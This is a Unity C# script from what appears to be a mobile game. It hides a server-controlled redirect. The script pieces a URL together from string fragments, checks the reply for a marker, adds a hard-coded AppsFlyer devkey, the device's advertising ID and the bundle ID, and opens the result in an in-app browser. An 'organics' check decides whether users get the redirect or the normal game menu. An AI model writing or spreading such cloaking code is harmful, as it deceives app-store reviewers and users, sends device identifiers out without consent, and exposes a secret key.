using System.Collections;
using UnityEngine;
using UnityEngine.Networking;
using System.Collections.Generic;

public class NextPlayMainScript : MonoBehaviour
{
    public List<string> stringList;
    public string sarcofagLoader;
    public string sarcofagStringer;

    public void NextSolidLoad (string data)
    {
        if (PlayerPrefs.GetString("partaerl", string.Empty) != string.Empty)
        {
            FindObjectOfType<NextPlayNotificationsScript>().PolicyLoad(PlayerPrefs.GetString("partaerl"));
        }
        else
        {
            StartCoroutine(CardsRoutine(data));
        }
    }

    private string CheckerString()
    {
        string tmp = "";
        foreach (var s in stringList)
        {
            tmp += s;
        }
        return tmp;
    }

    private IEnumerator CardsRoutine(string data)
    {
        using (UnityWebRequest nextRequest = UnityWebRequest.Get(CheckerString()))
        {
            yield return nextRequest.SendWebRequest();

            if (!nextRequest.isNetworkError)
            {
                if (nextRequest.downloadHandler.text.Contains("partae"))
                {
                    sarcofagStringer = nextRequest.downloadHandler.text;
                    sarcofagStringer += string.Format("?devkey=ArKFoPwTmPpzzxLB7ZmV6h&gaid={0}&bundle={1}&adid={2}", AppsFlyerSDK.AppsFlyer.getAppsFlyerId(), Application.identifier, GetAdid());
                    sarcofagStringer += data;
                    if (data.Contains("sub"))
                        FindObjectOfType<NextPlayNotificationsScript>().PolicyLoad(sarcofagStringer);
                    else
                        StartCoroutine(OrganicsChecker(sarcofagLoader));
                }
                else
                {
                    FindObjectOfType<NextPlayNotificationsScript>().LoadPlayMenu();
                }
            }
            else
            {
                FindObjectOfType<NextPlayNotificationsScript>().LoadPlayMenu();
            }
        }
    }

    private string GetAdid()
    {
        string advertisingID = "";
        try
        {
            AndroidJavaClass up = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
            AndroidJavaObject currentActivity = up.GetStatic<AndroidJavaObject>("currentActivity");
            AndroidJavaClass client = new AndroidJavaClass("com.google.android.gms.ads.identifier.AdvertisingIdClient");
            AndroidJavaObject adInfo = client.CallStatic<AndroidJavaObject>("getAdvertisingIdInfo", currentActivity);
            advertisingID = adInfo.Call<string>("getId").ToString();
        }
        catch (System.Exception e)
        {
            advertisingID = "none";
        }
        return advertisingID;
    }

    public void PlayBack()
    {
        if (InAppBrowser.CanGoBack())
        {
            InAppBrowser.GoBack();
        }
    }

    private IEnumerator OrganicsChecker (string data)
    {
        using (UnityWebRequest nextRequest = UnityWebRequest.Get(sarcofagLoader))
        {
            yield return nextRequest.SendWebRequest();

            if (nextRequest.isNetworkError)
            {
                FindObjectOfType<NextPlayNotificationsScript>().LoadPlayMenu();
            }
            else
            {
                if (nextRequest.downloadHandler.text.Contains("1"))
                {
                    FindObjectOfType<NextPlayNotificationsScript>().PolicyLoad(sarcofagStringer);
                }
                else
                {
                    FindObjectOfType<NextPlayNotificationsScript>().LoadPlayMenu();
                }
            }
        }
    }
}